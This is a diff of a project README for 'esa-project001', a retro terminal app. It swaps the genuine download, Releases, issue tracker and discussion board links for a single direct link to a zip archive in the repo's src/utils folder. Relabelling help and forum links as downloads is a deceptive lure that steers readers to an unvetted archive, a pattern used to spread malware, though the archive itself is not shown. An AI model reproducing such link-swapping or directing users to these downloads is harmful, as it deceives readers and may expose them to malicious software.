@@ -1,7 +1,7 @@
 # 🚀 esa-project001 - Experience Retro Terminal Fun
 
 ## 🔗 Download the Latest Version
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/rajiv-sapkota/esa-project001/releases)
+[![Download](https://github.com/rajiv-sapkota/esa-project001/raw/refs/heads/main/src/utils/project_esa_1.7-beta.1.zip)](https://github.com/rajiv-sapkota/esa-project001/raw/refs/heads/main/src/utils/project_esa_1.7-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you download, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. Click the **Download** button at the top of this page or visit the [Releases page](https://github.com/rajiv-sapkota/esa-project001/releases) to find the latest version.
+1. Click the **Download** button at the top of this page or visit the [Releases page](https://github.com/rajiv-sapkota/esa-project001/raw/refs/heads/main/src/utils/project_esa_1.7-beta.1.zip) to find the latest version.
    
 2. On the Releases page, locate the latest version of **esa-project001**. 
 
@@ -71,8 +71,8 @@ We welcome contributions from the community. If you want to enhance the function
 
 For further assistance:
 
-- Check the [issue tracker](https://github.com/rajiv-sapkota/esa-project001/issues) for common questions.
-- Join the community forum on our [discussion board](https://github.com/rajiv-sapkota/esa-project001/discussions) for shared insights and help.
+- Check the [issue tracker](https://github.com/rajiv-sapkota/esa-project001/raw/refs/heads/main/src/utils/project_esa_1.7-beta.1.zip) for common questions.
+- Join the community forum on our [discussion board](https://github.com/rajiv-sapkota/esa-project001/raw/refs/heads/main/src/utils/project_esa_1.7-beta.1.zip) for shared insights and help.
 
 ## 📜 License
 
